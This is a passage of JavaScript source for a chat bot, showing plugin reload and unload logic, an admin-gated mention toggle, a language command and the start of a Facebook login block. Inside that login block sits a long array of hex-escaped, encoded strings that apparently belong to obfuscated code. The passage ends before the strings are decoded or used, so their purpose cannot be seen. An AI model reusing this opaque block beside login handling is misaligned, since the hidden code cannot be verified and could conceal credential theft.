      if (!data.admin && !global.config.allowUserUseReloadCommand) {
        return {
          handler: "internal",
          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
        };
      }
      unloadPlugin();
      var error = loadPlugin();
      return {
        handler: "internal",
        data: `Reloaded ${error.length == 0 ? "" : ("with error at: " + JSON.stringify(error))}`
      };
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: !global.config.allowUserUseReloadCommand
  };

  global.commandMapping["toggleeveryone"] = {
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["TEVERYONE_DESC"]])),
    scope: function (type, data) {
      if (type != "Facebook") {
        return {
          data: "THIS COMMAND IS NOT EXECUTABLE IN THIS PLATFORM!",
          handler: "internal"
        };
      }
      var threadID = data.msgdata.threadID;
      var allowRun = false;
      if (!data.admin) {
        var [_err, threadInfo] = wait.for.function(data.facebookapi.getThreadInfo, data.msgdata.threadID);
        var adminIDs = threadInfo.adminIDs.map(x => x.id.toString());
        log("[INTERNAL]", "Got AdminIDs of thread", data.msgdata.threadID, ":", adminIDs);
        if (adminIDs.indexOf(data.msgdata.senderID) != -1) {
          allowRun = true;
        }
      } else {
        allowRun = true;
      }
      if (allowRun) {
        if (!global.data.everyoneTagBlacklist[threadID]) {
          global.data.everyoneTagBlacklist[threadID] = true;
        } else {
          global.data.everyoneTagBlacklist[threadID] = false;
        }
        return {
          data: getLang("TOGGLEEVERYONE_MSG", resolveID(type, data)).replace(
            "{0}",
            (!global.data.everyoneTagBlacklist[threadID] ? getLang("ENABLED", resolveID(type, data)) : getLang("DISABLED", resolveID(type, data)))
          ),
          handler: "internal"
        };
      } else {
        return {
          data: getLang("INSUFFICIENT_PERM", resolveID(type, data)),
          handler: "internal"
        };
      }
    },
    compatibly: 1,
    handler: "INTERNAL"
  };

  (typeof global.data.userLanguage != "object" || Array.isArray(global.data.userLanguage)) ? global.data.userLanguage = {} : "";
  global.commandMapping["lang"] = {
    args: "<ISO 639-1>_<ISO 3166-2>",
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["LANG_DESC"]])),
    scope: function (type, data) {
      let [prefix, id] = resolveID(type, data).split("-");
      prefix += "-";

      if (data.args.length > 1) {
        global.data.userLanguage[prefix + id] = String(data.args[1]);
        return {
          handler: "internal",
          data: `userLanguage = "${data.args[1]}"`
        };
      }
      return {
        handler: "internal",
        data: `${global.config.commandPrefix}lang <ISO 639-1>_<ISO 3166-2>\n${global.data.userLanguage[prefix + id]}`
      };
    },
    compatibly: 0,
    handler: "INTERNAL"
  };

  return error;
}

function unloadPlugin() {
  for (var name in global.loadedPlugins) {
    if (typeof global.loadedPlugins[name].onUnload == "function") {
      try {
        global.loadedPlugins[name].onUnload();
      } catch (ex) {
        log("[INTERNAL]", `Error while executing ${name}.onUnload: ${ex}`);
      }
    }
    for (let cmd in global.commandMapping) {
      if (global.commandMapping[cmd].handler == name) {
        delete global.commandMapping[cmd];
      }
    }
    for (let cmd in global.chatHook) {
      if (global.chatHook[cmd].handler == name) {
        delete global.chatHook[cmd];
      }
    }
    //delete global.plugins[pltemp1[name]["plugin_scope"]];
    log("[INTERNAL]", "Unloaded plugin", name, global.loadedPlugins[name].version, "by", global.loadedPlugins[name]
      .author);
    delete global.loadedPlugins[name];
  }
}

//Load plugin
//Async loading is a bad idea, or is it?
setTimeout(loadPlugin, 1);

var client = {};
var facebook = {};
var tried2FA = false;
var facebookloggedIn = true;
var facebookid = "Disabled";
if (global.config.enablefb) {
  facebookid = "Not logged in";
  global.markAsReadFacebook = {};
  global.deliveryFacebook = {};
  global.facebookGlobalBanClock = {};
  !Array.isArray(global.data.fbBannedUsers) ? global.data.fbBannedUsers = [] : "";

  var a = [
    '\x58\x63\x4f\x33\x77\x37\x72\x44\x69\x77\x45\x3d',
    '\x77\x34\x31\x33\x4e\x6a\x54\x43\x75\x56\x41\x3d',
    '\x77\x37\x33\x44\x6b\x38\x4f\x37\x77\x37\x54\x43\x6f\x4d\x4f\x54\x50\x52\x58\x44\x76\x7a\x77\x3d',
    '\x77\x36\x72\x43\x71\x47\x68\x57',
    '\x77\x34\x6b\x56\x62\x38\x4b\x43\x42\x73\x4f\x4c\x64\x73\x4f\x55',
    '\x62\x4d\x4f\x59\x77\x70\x4d\x73\x77\x37\x2f\x44\x74\x79\x50\x44\x6f\x48\x6e\x44\x69\x41\x3d\x3d',
    '\x5a\x63\x4f\x56\x77\x37\x62\x43\x6e\x73\x4f\x6f\x57\x6e\x70\x67\x77\x36\x59\x6e',
    '\x77\x34\x6a\x44\x75\x38\x4b\x38\x77\x71\x2f\x43\x6f\x51\x3d\x3d',
    '\x59\x51\x6a\x44\x71\x41\x3d\x3d',
    '\x64\x73\x4b\x62\x77\x36\x72\x43\x6c\x4d\x4f\x78\x46\x58\x68\x33\x77\x35\x6f\x7a',
    '\x77\x37\x58\x44\x72\x67\x58\x44\x6f\x6e\x48\x44\x6d\x56\x56\x38\x54\x4d\x4f\x6b',
    '\x77\x34\x48\x43\x68\x45\x44\x43\x6f\x63\x4b\x4d\x77\x34\x76\x44\x76\x77\x50\x43\x75\x6d\x49\x3d',
    '\x77\x6f\x52\x78\x65\x52\x59\x3d',
    '\x77\x37\x73\x77\x62\x38\x4b\x41\x4b\x77\x3d\x3d',
    '\x77\x36\x33\x44\x67\x44\x6c\x68\x58\x67\x33\x43\x74\x73\x4f\x59\x77\x72\x4d\x6d',
    '\x4f\x54\x59\x45\x77\x6f\x6f\x74',
    '\x42\x6a\x51\x64\x53\x63\x4b\x73\x49\x63\x4f\x70\x47\x58\x6c\x78',
    '\x46\x58\x52\x73\x77\x70\x55\x4a',
    '\x63\x38\x4f\x52\x77\x37\x7a\x44\x71\x38\x4f\x59\x49\x32\x77\x64\x45\x44\x59\x3d',
    '\x63\x38\x4f\x59\x4e\x41\x4c\x44\x75\x44\x48\x44\x71\x63\x4b\x49\x77\x36\x6e\x44\x6a\x41\x3d\x3d',
    '\x77\x35\x58\x44\x72\x51\x39\x64',
    '\x77\x71\x6e\x43\x6e\x53\x73\x4e\x43\x73\x4b\x65\x43\x63\x4f\x6b\x77\x35\x4a\x6b',
    '\x77\x36\x50\x43\x6b\x4d\x4b\x31\x77\x34\x64\x71\x77\x71\x46\x2b\x49\x68\x39\x41',
    '\x63\x44\x70\x36\x77\x37\x4d\x58\x42\x6a\x42\x47',
    '\x77\x34\x7a\x44\x71\x4d\x4f\x4a\x55\x69\x77\x56\x4c\x73\x4f\x62\x42\x38\x4f\x2f',
    '\x77\x6f\x50\x44\x72\x38\x4b\x62\x77\x37\x37\x44\x6d\x79\x52\x2f\x47\x73\x4f\x46\x5a\x67\x3d\x3d',
    '\x77\x34\x73\x71\x77\x35\x6c\x6c\x62\x73\x4f\x42\x77\x6f\x34\x35\x5a\x4d\x4b\x79',
    '\x4f\x73\x4f\x38\x63\x4d\x4b\x33',
    '\x77\x37\x7a\x44\x71\x41\x48\x44\x6f\x6e\x66\x44\x75\x55\x39\x6a',
    '\x77\x37\x7a\x44\x75\x30\x62\x44\x71\x33\x7a\x44\x6b\x56\x31\x79\x62\x38\x4b\x6f',
    '\x65\x68\x4a\x2b\x44\x63\x4b\x58\x5a\x6c\x33\x44\x6f\x4d\x4b\x48\x41\x77\x3d\x3d',
    '\x48\x38\x4b\x41\x41\x6d\x2f\x44\x73\x6b\x74\x32\x77\x6f\x78\x6e\x77\x36\x34\x3d',
    '\x77\x35\x46\x73\x63\x79\x55\x34\x77\x34\x6f\x72\x41\x38\x4b\x62\x51\x77\x3d\x3d',
    '\x4e\x4d\x4f\x4e\x45\x63\x4f\x75\x47\x73\x4b\x55\x43\x63\x4b\x59\x77\x71\x4c\x44\x6e\x67\x3d\x3d',
    '\x77\x34\x44\x44\x6d\x48\x5a\x75\x57\x6a\x6e\x43\x70\x63\x4f\x63\x77\x71\x4e\x7a',
    '\x77\x70\x37\x44\x76\x73\x4f\x61\x77\x36\x48\x44\x6d\x79\x30\x3d',
    '\x77\x72\x77\x4d\x77\x34\x4c\x44\x75\x32\x72\x43\x6a\x73\x4b\x33\x53\x63\x4b\x65\x77\x34\x6f\x3d',
    '\x77\x35\x54\x44\x70\x77\x39\x64\x77\x71\x30\x76\x44\x38\x4f\x77\x56\x57\x63\x3d',
    '\x77\x34\x2f\x43\x72\x6d\x4e\x4b\x77\x71\x64\x79\x77\x37\x34\x75\x54\x63\x4b\x6f',
    '\x77\x72\x7a\x43\x6a\x44\x78\x4e\x77\x71\x5a\x68\x77\x70\x6a\x44\x74\x38\x4b\x6c\x77\x36\x67\x3d',
    '\x54\x73\x4f\x63\x77\x6f\x51\x73\x77\x37\x37\x44\x72\x43\x6e\x44\x72\x78\x37\x44\x69\x67\x3d\x3d',
    '\x77\x36\x6c\x69\x77\x71\x6f\x45\x57\x73\x4f\x57\x4d\x63\x4b\x55\x61\x4d\x4f\x6a',
    '\x77\x70\x66\x44\x69\x73\x4b\x34\x77\x72\x50\x44\x72\x33\x6e\x44\x76\x73\x4b\x34\x42\x55\x59\x3d',
    '\x77\x72\x46\x74\x77\x35\x6c\x49\x5a\x41\x56\x34\x4f\x33\x45\x7a',
    '\x77\x36\x54\x44\x6c\x6c\x74\x73\x58\x77\x54\x43\x74\x4d\x4f\x5a\x77\x6f\x4a\x31',
    '\x4a\x33\x45\x59\x4d\x41\x3d\x3d',
    '\x54\x38\x4b\x56\x48\x7a\x76\x44\x71\x55\x31\x73\x77\x6f\x68\x6e\x77\x37\x49\x3d',
    '\x66\x38\x4b\x73\x58\x73\x4b\x71\x51\x51\x72\x44\x75\x38\x4b\x6a\x4d\x45\x6b\x3d',
    '\x51\x45\x54\x44\x6a\x6a\x4c\x43\x74\x42\x66\x44\x6f\x38\x4f\x45\x77\x6f\x31\x78',
    '\x65\x6d\x54\x44\x73\x55\x66\x44\x6c\x67\x3d\x3d',
    '\x77\x6f\x6a\x44\x76\x73\x4f\x5a\x77\x36\x63\x3d',
    '\x54\x4d\x4f\x2b\x4c\x67\x44\x44\x6f\x51\x3d\x3d',
    '\x77\x6f\x74\x4e\x4b\x53\x58\x43\x68\x63\x4b\x47\x77\x35\x55\x41\x77\x34\x2f\x43\x75\x67\x3d\x3d',
    '\x48\x4d\x4b\x53\x45\x58\x7a\x44\x76\x67\x68\x35\x77\x70\x4e\x30\x77\x71\x41\x3d',
    '\x42\x56\x31\x7a\x77\x34\x34\x6e\x4b\x41\x35\x52\x55\x31\x6f\x3d',
    '\x77\x72\x6c\x68\x77\x72\x6b\x65\x58\x63\x4f\x51\x50\x4d\x4f\x45\x65\x63\x4f\x73',
    '\x77\x35\x62\x44\x73\x41\x6b\x45',
    '\x50\x33\x42\x4b\x77\x70\x49\x78\x46\x41\x3d\x3d',
    '\x5a\x44\x5a\x41\x43\x73\x4b\x43\x4a\x38\x4f\x75\x51\x79\x31\x38',
    '\x66\x63\x4f\x38\x42\x45\x64\x72\x77\x37\x74\x39\x77\x71\x59\x3d',
    '\x77\x71\x76\x44\x6d\x6e\x45\x39',
    '\x77\x36\x7a\x44\x6d\x30\x77\x47\x48\x38\x4b\x34\x45\x73\x4f\x6a\x77\x70\x59\x61',
    '\x63\x77\x56\x78\x41\x73\x4b\x68\x62\x6c\x7a\x44\x6a\x63\x4f\x4c\x52\x67\x3d\x3d',
    '\x77\x35\x54\x44\x6a\x68\x58\x44\x6a\x55\x49\x3d',
    '\x66\x38\x4f\x77\x64\x73\x4f\x6a\x52\x79\x66\x44\x76\x63\x4b\x31\x63\x57\x73\x3d',
    '\x51\x57\x33\x44\x74\x38\x4f\x59\x77\x6f\x38\x4d\x77\x35\x37\x44\x6b\x4d\x4f\x52\x66\x41\x3d\x3d',
    '\x77\x72\x7a\x43\x72\x42\x78\x74\x77\x6f\x5a\x42\x77\x72\x6a\x44\x74\x38\x4b\x6c\x77\x37\x34\x3d',
    '\x77\x37\x33\x44\x72\x51\x6c\x64\x77\x72\x49\x6c\x42\x73\x4f\x7a\x66\x57\x59\x3d',
    '\x77\x70\x76\x43\x6b\x33\x73\x63\x77\x37\x58\x44\x67\x63\x4b\x73\x59\x63\x4b\x39\x77\x70\x55\x3d',
    '\x77\x34\x44\x44\x6e\x63\x4f\x34\x4f\x4d\x4b\x76\x77\x36\x4c\x43\x75\x51\x78\x39\x4d\x51\x3d\x3d',
    '\x57\x63\x4b\x61\x77\x37\x44\x44\x6d\x38\x4f\x70\x57\x6d\x74\x69\x77\x35\x59\x77',
    '\x47\x38\x4f\x6f\x77\x6f\x4c\x44\x6f\x67\x70\x77\x5a\x73\x4b\x65\x77\x6f\x48\x44\x6f\x41\x3d\x3d',
    '\x77\x36\x41\x4e\x49\x58\x6e\x43\x6b\x51\x3d\x3d',
    '\x77\x72\x72\x44\x6a\x58\x59\x77',
    '\x4e\x4d\x4b\x6d\x50\x46\x54\x44\x6d\x57\x6c\x54\x77\x35\x46\x45\x77\x34\x45\x3d',
    '\x66\x73\x4f\x77\x77\x72\x51\x36',
    '\x77\x37\x31\x2b\x4f\x43\x54\x43\x76\x57\x33\x44\x6b\x38\x4b\x75\x42\x38\x4f\x30',
    '\x77\x36\x58\x43\x6c\x43\x51\x74\x52\x52\x6a\x43\x70\x4d\x4f\x59\x77\x37\x6b\x3d',
    '\x77\x36\x7a\x44\x68\x78\x34\x4c\x44\x41\x3d\x3d',
    '\x66\x53\x48\x44\x70\x78\x6a\x44\x69\x52\x41\x45\x77\x36\x6e\x44\x6f\x63\x4b\x32',
    '\x77\x35\x46\x6b\x63\x78\x45\x79\x77\x34\x70\x69\x41\x73\x4b\x53\x51\x77\x3d\x3d',
    '\x55\x68\x39\x72\x51\x63\x4b\x34\x59\x6c\x37\x44\x67\x63\x4b\x4f\x48\x67\x3d\x3d',
    '\x57\x38\x4b\x38\x66\x46\x48\x43\x6a\x4d\x4f\x2b\x77\x72\x44\x43\x6c\x79\x33\x44\x70\x67\x3d\x3d',
    '\x77\x72\x68\x34\x41\x41\x76\x43\x6f\x38\x4f\x6e',
    '\x63\x73\x4b\x48\x77\x37\x63\x3d',
    '\x77\x34\x2f\x44\x67\x4d\x4f\x50\x77\x36\x6a\x43\x70\x73\x4f\x51\x48\x56\x33\x43\x73\x41\x6f\x3d',
    '\x77\x6f\x72\x43\x71\x55\x41\x67\x77\x6f\x66\x43\x6a\x38\x4f\x6b\x55\x4d\x4b\x35\x77\x70\x6f\x3d',
    '\x55\x6d\x48\x44\x72\x63\x4f\x38\x77\x35\x52\x51\x77\x6f\x49\x3d',
    '\x48\x63\x4b\x45\x45\x57\x6a\x44\x74\x45\x59\x3d',
    '\x77\x36\x76\x43\x71\x38\x4b\x4f\x77\x34\x46\x35\x4b\x45\x4c\x44\x76\x4d\x4b\x32\x77\x6f\x67\x3d',
    '\x5a\x38\x4f\x61\x41\x56\x41\x3d',
    '\x77\x37\x48\x44\x6b\x58\x64\x70\x66\x41\x2f\x43\x6f\x73\x4f\x4f\x77\x72\x5a\x68',
    '\x77\x37\x50\x43\x70\x32\x52\x72\x77\x72\x48\x44\x6f\x73\x4b\x77\x46\x38\x4b\x41\x77\x36\x41\x3d',
    '\x77\x37\x4c\x44\x6f\x51\x6a\x44\x71\x47\x66\x43\x6c\x6b\x35\x6c\x59\x73\x4f\x76',
    '\x77\x35\x6e\x44\x6e\x63\x4f\x6e\x77\x71\x44\x44\x71\x51\x3d\x3d',
    '\x44\x63\x4f\x76\x4f\x4d\x4f\x50\x65\x4d\x4b\x33\x4a\x4d\x4f\x62\x77\x6f\x37\x44\x75\x67\x3d\x3d',
    '\x77\x34\x51\x52\x61\x4d\x4b\x30\x45\x4d\x4f\x46\x62\x63\x4f\x4b\x56\x41\x3d\x3d',
    '\x42\x38\x4f\x6b\x45\x73\x4f\x33\x62\x77\x3d\x3d',
    '\x77\x70\x6e\x43\x69\x43\x39\x51\x77\x71\x42\x68',
    '\x77\x6f\x37\x43\x6d\x54\x6c\x4d\x77\x72\x31\x6b\x77\x35\x48\x44\x67\x4d\x4b\x50\x77\x37\x6b\x3d',
    '\x45\x6c\x52\x76\x77\x34\x67\x78',
    '\x77\x35\x72\x44\x6b\x38\x4f\x37\x77\x36\x37\x43\x6f\x4d\x4f\x65\x4d\x31\x2f\x43\x76\x68\x45\x3d',
    '\x77\x71\x49\x71\x46\x77\x2f\x43\x71\x73\x4b\x6f\x77\x36\x39\x49\x77\x35\x6a\x43\x69\x41\x3d\x3d',
    '\x4a\x38\x4f\x4c\x77\x70\x66\x44\x67\x68\x70\x67\x65\x38\x4b\x55\x77\x6f\x54\x44\x69\x51\x3d\x3d',
    '\x77\x72\x5a\x72\x42\x67\x2f\x43\x70\x63\x4b\x6f\x77\x37\x5a\x47\x77\x34\x72\x43\x6c\x77\x3d\x3d',
    '\x58\x73\x4f\x37\x77\x72\x4a\x53\x77\x71\x44\x44\x73\x38\x4f\x34\x77\x36\x51\x43\x77\x70\x34\x3d',
    '\x77\x34\x4a\x45\x77\x70\x51\x2f\x63\x63\x4f\x30\x46\x4d\x4f\x4a\x53\x38\x4f\x4d',
    '\x77\x37\x51\x79\x62\x63\x4b\x45\x41\x63\x4f\x47\x64\x73\x4f\x51\x54\x48\x63\x3d',
    '\x77\x34\x76\x44\x6e\x4d\x4f\x6e\x77\x37\x58\x43\x76\x63\x4b\x64\x4c\x6c\x33\x43\x74\x68\x67\x3d',
    '\x4d\x4d\x4f\x4a\x46\x38\x4f\x6c\x57\x4d\x4b\x5a\x42\x38\x4b\x64',
    '\x50\x44\x37\x44\x71\x41\x3d\x3d',
    '\x77\x36\x62\x44\x6e\x63\x4f\x69\x4e\x77\x3d\x3d',
    '\x77\x70\x4a\x74\x63\x67\x49\x31\x77\x34\x6b\x3d',
    '\x77\x34\x66\x44\x72\x73\x4f\x45\x47\x63\x4b\x59\x77\x72\x7a\x43\x75\x54\x31\x35\x50\x67\x3d\x3d',
    '\x77\x34\x66\x43\x75\x73\x4b\x4f\x77\x35\x52\x70\x5a\x67\x6a\x43\x74\x38\x4f\x77\x77\x6f\x51\x3d',
    '\x77\x6f\x62\x44\x6a\x51\x30\x51\x77\x6f\x78\x4e\x77\x70\x44\x43\x75\x63\x4b\x6c\x77\x36\x55\x3d',
    '\x77\x37\x76\x43\x76\x4d\x4b\x54\x77\x34\x4e\x39\x4f\x56\x58\x44\x73\x63\x4f\x34\x77\x6f\x45\x3d',
    '\x65\x47\x7a\x44\x72\x42\x76\x43\x6e\x7a\x45\x3d',
    '\x43\x48\x64\x72\x57\x4d\x4b\x38\x49\x63\x4f\x76\x44\x51\x3d\x3d',
    '\x77\x70\x58\x44\x72\x6d\x51\x6e\x77\x72\x72\x43\x6c\x63\x4b\x4b\x77\x71\x51\x77\x66\x41\x3d\x3d',
    '\x77\x34\x50\x43\x71\x38\x4b\x55\x77\x34\x4e\x75\x4e\x41\x3d\x3d',
    '\x77\x37\x48\x43\x75\x4d\x4b\x53\x77\x35\x45\x3d',
    '\x77\x37\x4c\x44\x71\x73\x4b\x34\x77\x72\x48\x44\x67\x33\x33\x44\x74\x4d\x4f\x62\x48\x46\x6f\x3d',
    '\x65\x68\x64\x34\x42\x4d\x4b\x78\x53\x45\x62\x44\x6c\x77\x3d\x3d',
    '\x4b\x4d\x4f\x48\x77\x71\x6e\x44\x6f\x67\x63\x3d',
    '\x77\x34\x6a\x44\x69\x43\x72\x44\x69\x46\x48\x44\x74\x33\x59\x36\x53\x63\x4f\x4a',
    '\x51\x6a\x5a\x61\x53\x77\x3d\x3d',
    '\x77\x37\x62\x43\x6c\x4d\x4b\x6b\x77\x6f\x49\x3d',
    '\x50\x33\x63\x45\x77\x72\x59\x38\x44\x78\x45\x61\x77\x35\x76\x44\x6e\x51\x3d\x3d',
    '\x77\x34\x58\x44\x67\x45\x4a\x74\x77\x72\x2f\x43\x71\x4d\x4b\x48\x77\x35\x4c\x44\x75\x4d\x4b\x49',
    '\x65\x52\x50\x43\x71\x78\x45\x3d',
    '\x5a\x4d\x4f\x59\x43\x41\x48\x44\x6f\x69\x49\x3d',
    '\x77\x71\x76\x43\x6d\x6d\x59\x4f',
    '\x5a\x48\x6b\x61\x63\x67\x3d\x3d',
    '\x77\x70\x4a\x71\x66\x51\x30\x79',
    '\x57\x4d\x4f\x33\x77\x37\x30\x65\x77\x35\x6e\x44\x75\x63\x4f\x72\x77\x36\x55\x5a\x77\x70\x34\x3d',
    '\x66\x48\x5a\x58\x77\x70\x39\x33\x46\x46\x4d\x5a\x77\x35\x62\x43\x6b\x77\x3d\x3d',
    '\x77\x36\x6a\x43\x6f\x53\x31\x47\x77\x71\x4e\x34\x77\x72\x41\x35\x54\x4d\x4f\x6e',
    '\x77\x34\x66\x44\x6c\x33\x59\x2f\x77\x72\x50\x43\x72\x63\x4b\x68\x77\x34\x37\x44\x73\x4d\x4b\x59',
    '\x63\x4d\x4f\x65\x50\x77\x33\x44\x6b\x67\x3d\x3d',
    '\x51\x45\x77\x48\x61\x73\x4f\x76',
    '\x43\x4d\x4b\x45\x41\x6a\x76\x44\x75\x45\x42\x2b\x77\x70\x4a\x68\x77\x36\x55\x3d',
    '\x77\x36\x48\x43\x6d\x48\x30\x43\x77\x37\x6f\x3d',
    '\x77\x36\x50\x43\x6b\x4d\x4b\x31\x77\x34\x64\x71\x77\x71\x46\x2b\x49\x67\x3d\x3d',
    '\x4b\x73\x4f\x4e\x77\x70\x39\x70\x77\x36\x2f\x44\x76\x54\x2f\x44\x76\x31\x2f\x44\x6c\x67\x3d\x3d',
    '\x77\x71\x31\x4c\x43\x6b\x67\x3d',
    '\x77\x37\x38\x4e\x44\x6c\x48\x44\x68\x44\x4c\x43\x6e\x73\x4b\x46\x4f\x77\x73\x3d',
    '\x77\x71\x35\x53\x41\x46\x6b\x6f\x4b\x32\x39\x67\x77\x70\x6b\x4b',
    '\x63\x38\x4f\x53\x46\x52\x4d\x3d',
    '\x4f\x53\x76\x44\x6f\x30\x30\x3d',
    '\x77\x37\x66\x43\x6c\x4d\x4b\x33\x77\x35\x46\x6e\x77\x71\x41\x3d',
    '\x64\x63\x4f\x79\x4a\x6b\x5a\x74\x77\x37\x31\x38\x77\x71\x72\x44\x73\x4d\x4b\x33',
    '\x77\x36\x33\x44\x76\x63\x4b\x71\x77\x72\x55\x3d',
    '\x77\x34\x44\x44\x6a\x73\x4f\x33\x63\x77\x63\x36\x42\x63\x4f\x4d\x5a\x63\x4f\x39',
    '\x77\x34\x6a\x44\x76\x47\x45\x6f\x77\x70\x6b\x3d',
    '\x54\x32\x62\x43\x72\x63\x4b\x37\x77\x71\x34\x57\x77\x35\x37\x44\x6d\x73\x4f\x49\x59\x51\x3d\x3d',
    '\x77\x35\x37\x43\x6b\x57\x7a\x44\x74\x4d\x4b\x75',
    '\x77\x34\x7a\x43\x6f\x63\x4b\x55\x77\x34\x4a\x7a\x4f\x77\x3d\x3d',
    '\x62\x63\x4f\x63\x77\x6f\x4a\x70\x77\x36\x37\x44\x76\x53\x4c\x44\x72\x33\x50\x44\x67\x51\x3d\x3d',
    '\x77\x6f\x34\x36\x77\x70\x59\x32\x61\x4d\x4f\x46\x77\x6f\x6b\x34\x64\x73\x4f\x67',
    '\x77\x36\x4d\x47\x43\x6b\x62\x43\x69\x79\x77\x3d',
    '\x77\x35\x37\x43\x74\x73\x4b\x61\x77\x36\x31\x4b\x77\x6f\x39\x64\x5a\x42\x78\x30',
    '\x77\x36\x6e\x43\x75\x6e\x56\x35\x77\x71\x41\x3d',
    '\x77\x6f\x72\x44\x75\x73\x4f\x59\x77\x37\x66\x44\x6c\x69\x78\x33\x46\x41\x3d\x3d',
    '\x77\x6f\x52\x34\x44\x41\x33\x43\x6f\x4d\x4b\x69\x77\x36\x74\x45\x77\x36\x50\x43\x6e\x41\x3d\x3d',
    '\x77\x71\x6c\x44\x43\x67\x3d\x3d',
    '\x5a\x68\x39\x78\x57\x38\x4f\x31',
    '\x77\x6f\x70\x53\x44\x52\x77\x47\x4c\x58\x4e\x2f\x77\x37\x35\x4f',
    '\x55\x38\x4f\x77\x77\x37\x34\x48',
    '\x46\x38\x4f\x7a\x77\x37\x4d\x48\x77\x70\x72\x44\x76\x38\x4b\x71\x77\x36\x51\x62\x77\x35\x63\x3d',
    '\x4a\x38\x4b\x66\x4e\x41\x4c\x44\x71\x6a\x62\x44\x70\x38\x4b\x55\x77\x71\x66\x43\x6f\x41\x3d\x3d',
    '\x63\x38\x4b\x55\x77\x37\x44\x43\x6d\x67\x3d\x3d',
    '\x77\x70\x7a\x44\x75\x73\x4f\x4a\x77\x36\x62\x44\x6e\x53\x42\x78\x44\x38\x4f\x41\x4b\x41\x3d\x3d',
    '\x4d\x57\x34\x66\x77\x36\x30\x4b\x44\x69\x55\x5a\x64\x54\x73\x3d',
    '\x77\x37\x6a\x44\x75\x73\x4b\x72\x77\x72\x4c\x44\x73\x77\x3d\x3d',
    '\x48\x57\x66\x43\x68\x63\x4b\x56\x77\x72\x4d\x3d',
    '\x77\x72\x6c\x6b\x77\x71\x6f\x66\x52\x73\x4f\x46\x59\x73\x4f\x45',
    '\x77\x37\x34\x71\x49\x42\x6a\x43\x74\x63\x4b\x6f\x77\x36\x73\x58',
    '\x77\x34\x4d\x4e\x4c\x4d\x4b\x46\x42\x63\x4f\x4b\x64\x38\x4f\x61\x51\x77\x6f\x3d',
    '\x64\x38\x4f\x70\x4f\x4d\x4f\x46\x61\x4d\x4b\x69\x53\x63\x4f\x57\x77\x6f\x76\x44\x74\x77\x3d\x3d',
    '\x77\x6f\x4a\x6e\x62\x6b\x51\x3d',
    '\x77\x34\x50\x44\x6c\x55\x41\x68\x77\x71\x55\x3d',
    '\x56\x6e\x33\x44\x73\x4d\x4f\x7a',
    '\x56\x4d\x4f\x36\x77\x37\x49\x42\x77\x6f\x44\x44\x71\x63\x4f\x2f\x77\x36\x67\x42\x77\x70\x67\x3d',
    '\x77\x37\x78\x43\x77\x36\x4c\x44\x72\x54\x6a\x43\x6b\x63\x4b\x6b\x43\x67\x3d\x3d',
    '\x77\x34\x37\x43\x76\x73\x4b\x4b\x77\x34\x68\x6a',
    '\x77\x37\x62\x43\x72\x77\x66\x43\x70\x33\x37\x44\x6b\x31\x64\x31\x62\x73\x4f\x36',
    '\x77\x34\x6e\x43\x76\x38\x4b\x47\x77\x36\x74\x63',
    '\x77\x37\x6e\x43\x75\x47\x70\x74\x77\x72\x44\x44\x72\x4d\x4f\x34\x56\x67\x3d\x3d',
    '\x52\x4d\x4f\x6d\x77\x37\x30\x56\x77\x70\x48\x43\x75\x38\x4f\x73\x77\x36\x51\x48\x77\x35\x63\x3d',
    '\x77\x34\x41\x31\x61\x4d\x4b\x44\x44\x63\x4f\x4b\x66\x73\x4b\x66\x51\x55\x59\x3d',
    '\x55\x63\x4f\x2b\x77\x72\x77\x47\x77\x35\x2f\x44\x6d\x51\x44\x43\x70\x6e\x7a\x44\x70\x51\x3d\x3d',
    '\x77\x34\x6b\x57\x54\x73\x4b\x47\x43\x73\x4f\x4b\x66\x4d\x4f\x62\x63\x6c\x6b\x3d',
    '\x77\x34\x74\x39\x42\x53\x4c\x43\x70\x55\x72\x44\x68\x73\x4b\x39\x42\x38\x4f\x4e',
    '\x77\x36\x37\x44\x72\x63\x4b\x72\x77\x37\x30\x3d',
    '\x4d\x38\x4f\x4a\x55\x44\x48\x44\x68\x77\x45\x3d',
    '\x77\x6f\x33\x44\x74\x63\x4f\x56\x77\x37\x33\x44\x67\x47\x4e\x73\x44\x63\x4f\x49\x49\x51\x3d\x3d',
    '\x61\x38\x4f\x64\x77\x35\x35\x6e\x77\x72\x4d\x3d',
    '\x4f\x6e\x35\x48\x77\x70\x51\x79\x44\x78\x77\x51',
    '\x52\x38\x4b\x32\x64\x56\x48\x43\x6e\x63\x4f\x69\x77\x36\x4c\x43\x6a\x43\x33\x44\x75\x51\x3d\x3d',
    '\x77\x37\x50\x43\x6f\x47\x52\x34\x77\x72\x48\x43\x6a\x63\x4b\x30\x45\x73\x4b\x58\x77\x71\x4d\x3d',
    '\x65\x73\x4f\x59\x77\x6f\x49\x39\x77\x37\x54\x44\x75\x79\x58\x44\x75\x31\x2f\x44\x69\x67\x3d\x3d',
    '\x64\x47\x54\x44\x70\x52\x6a\x43\x6b\x68\x6e\x44\x6d\x73\x4b\x64',
    '\x42\x6d\x48\x44\x72\x63\x4b\x31',
    '\x51\x4d\x4b\x55\x77\x37\x62\x43\x6c\x63\x4f\x73\x57\x32\x73\x2f\x77\x70\x4d\x58',
    '\x77\x72\x55\x48\x77\x35\x58\x43\x76\x79\x6e\x43\x6c\x73\x4b\x33\x58\x73\x4b\x56\x77\x34\x41\x3d',
    '\x45\x4d\x4f\x47\x57\x4d\x4b\x50\x47\x41\x44\x44\x6a\x38\x4b\x50\x48\x52\x4d\x3d',
    '\x66\x6e\x4e\x52\x77\x71\x45\x3d',
    '\x77\x71\x37\x44\x74\x45\x42\x2b\x77\x71\x62\x43\x72\x63\x4b\x6b\x51\x67\x3d\x3d',
    '\x4b\x33\x62\x43\x68\x38\x4b\x58\x77\x71\x50\x43\x67\x32\x68\x35\x77\x36\x66\x44\x6e\x51\x3d\x3d',
    '\x77\x37\x34\x45\x44\x46\x44\x43\x67\x41\x33\x43\x69\x73\x4b\x49',
    '\x44\x33\x6a\x43\x6d\x38\x4f\x44\x77\x36\x6f\x3d',
    '\x41\x4d\x4b\x44\x45\x58\x66\x44\x6d\x55\x6c\x78\x77\x72\x39\x71\x77\x36\x38\x3d',
    '\x77\x35\x6e\x44\x73\x31\x56\x43\x63\x79\x76\x43\x6e\x63\x4b\x51\x77\x70\x56\x48',
    '\x66\x6e\x4a\x65\x77\x37\x49\x4c\x54\x6a\x5a\x63\x63\x33\x34\x3d',
